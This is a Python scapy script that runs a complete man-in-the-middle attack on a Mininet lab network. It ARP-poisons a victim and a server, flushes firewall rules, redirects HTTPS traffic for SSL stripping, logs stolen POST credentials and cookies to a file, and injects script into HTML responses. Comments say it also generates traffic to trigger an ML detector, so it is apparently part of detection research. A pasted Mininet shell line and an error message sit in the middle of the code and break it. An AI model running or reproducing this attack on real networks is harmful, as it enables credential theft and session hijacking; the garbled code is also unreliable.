# -*- coding: utf-8 -*-
"""
attacker_mitm.py
COMPLETE realistic MITM attack:
- ARP poisoning        (redirect traffic)
- IP forwarding        (stay invisible)
- HTTP interception    (steal credentials)
- SSL stripping        (downgrade HTTPS)
- Cookie stealing      (session hijack)
- Traffic injection    (modify responses)
- Bulk traffic gen     (generate realistic flow patterns)
"""

import os
import time
import threading
import re
from scapy.all import *

# Configuration
VICTIM_IP  = "10.0.0.1"
SERVER_IP  = "10.0.0.2"
IFACE      = "h3-eth0"
STOLEN     = "/tmp/mitm_stolen.txt"

# ── Stage 1: Enable IP forwarding ──────────────────────
# This allows the host to act as a router
os.system("sysctl -w net.ipv4.ip_forward=1")
os.system("sysctl -w net.ipv4.conf.all.send_redirects=0")

# ── Stage 2: Enable iptables traffic forwarding ─────────
# This ensures that traffic is forwarded correctly and matches flow patterns
os.system("iptables -F")
os.system("iptables -t nat -F")
os.system("iptables -P FORWARD ACCEPT")

# ── Stage 3: SSL stripping via iptables ─────────────────
# Redirect HTTPS (443) to port 10000 (our sslstrip listener placeholder)
os.system("iptables -t nat -A PREROUTING -p tcp --destination-port 443 -j REDIRECT --to-ports 10000")

# ── Stage 4: ARP Poison both sides ──────────────────────
def get_mac(ip):
    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip),
                 iface=IFACE, timeout=2, verbose=False)
    return ans[0][1].hwsrc if ans else None

def arp_poison_loop(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    my_mac     = get_if_hwaddr(IFACE)
    if not target_mac:
        print("Cannot find {}".format(target_ip))
        return
    
    # Building the ARP packet
    pkt = Ether(dst=target_mac)/ARP(
        op=2, pdst=target_ip, hwdst=target_mac,
        psrc=spoof_ip, hwsrc=my_mac)
    
    while True:
        sendp(pkt, iface=IFACE, verbose=False)
        time.sleep(0.5)   # Fast poison loop

# ── Stage 5: Packet relay with modification ─────────────
def relay_and_intercept(pkt):
    if IP not in pkt:
        return

    src = pkt[IP].src
    dst = pkt[IP].dst

    # Intercept HTTP credentials
    if pkt.haslayer(TCP) and pkt.haslayer(Raw):
        payload = pkt[Raw].load.decode('utf-8', errors='ignore')

        #  h3 python3 /app/scripts/attacker_mitm.py
python3: can't open file '/app/scripts/attacker_mitm.py': [Errno 2] No such file or directory
mininet>  Steal POST credentials
        if 'POST' in payload and ('username' in payload or 'password' in payload):
            ts = time.strftime('%H:%M:%S')
            stolen_data = "[{}] CREDENTIALS STOLEN!\n  From: {}\n  To:   {}\n  Data: {}\n".format(
                ts, src, dst, payload[:300]
            )
            print("\n" + "🎯"*20)
            print(stolen_data)
            print("🎯"*20 + "\n")
            with open(STOLEN, 'a') as f:
                f.write(stolen_data)

        # Steal cookies
        if 'Cookie:' in payload:
            cookie = re.findall(r'Cookie: (.+)', payload)
            if cookie:
                ts = time.strftime('%H:%M:%S')
                line = "[{}] COOKIE STOLEN: {}\n".format(ts, cookie[0][:200])
                print("🍪 {}".format(line.strip()))
                with open(STOLEN, 'a') as f:
                    f.write(line)

        # Inject malicious content into HTTP responses
        if 'HTTP/1' in payload and 'text/html' in payload:
            # Add tracking pixel to every response
            modified = payload.replace(
                '</body>',
                '<script>document.title="HACKED by MITM"</script></body>'
            )
            
            # Update the packet with modified payload
            pkt[Raw].load = modified.encode('utf-8', errors='ignore')
            
            # Recalculate checksums
            del pkt[IP].chksum
            del pkt[TCP].chksum
            
            # Re-send the modified packet
            # Note: With ip_forward=1, the original packet might also be forwarded by the kernel
            sendp(pkt, iface=IFACE, verbose=False)

# ── Stage 6: Generate bulk realistic traffic ─────────────
def generate_bulk_traffic():
    """Send repeated HTTP requests to build up flow stats for ML detection"""
    import socket
    while True:
        try:
            # Connect to server on port 8080 (assuming server_login.py is there)
            for _ in range(30):
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(1)
                try:
                    s.connect((SERVER_IP, 8080))
                    s.send(b"GET / HTTP/1.1\r\nHost: 10.0.0.2\r\nConnection: close\r\n\r\n")
                    s.recv(1024)
                finally:
                    s.close()
            time.sleep(0.1)
        except Exception:
            time.sleep(1)

# ── START ALL ATTACK STAGES ──────────────────────────────
print("="*50)
print("🔴 MITM ATTACK STARTING")
print("="*50)

# Thread 1: Poison victim
t1 = threading.Thread(target=arp_poison_loop,
                      args=(VICTIM_IP, SERVER_IP), daemon=True)
# Thread 2: Poison server
t2 = threading.Thread(target=arp_poison_loop,
                      args=(SERVER_IP, VICTIM_IP), daemon=True)
# Thread 3: Generate bulk traffic for ML detection
t3 = threading.Thread(target=generate_bulk_traffic, daemon=True)

t1.start()
t2.start()
time.sleep(2)   # Let ARP poison take effect first
t3.start()

print("✅ ARP Poisoning: active")
print("✅ IP Forwarding: active")
print("✅ Bulk traffic:  active (ML will fire in ~5 seconds)")
print("✅ Logging to:    {}".format(STOLEN))

# Sniff and process all intercepted traffic
sniff(filter="ip host {} or ip host {}".format(VICTIM_IP, SERVER_IP),
      prn=relay_and_intercept, iface=IFACE, store=False)
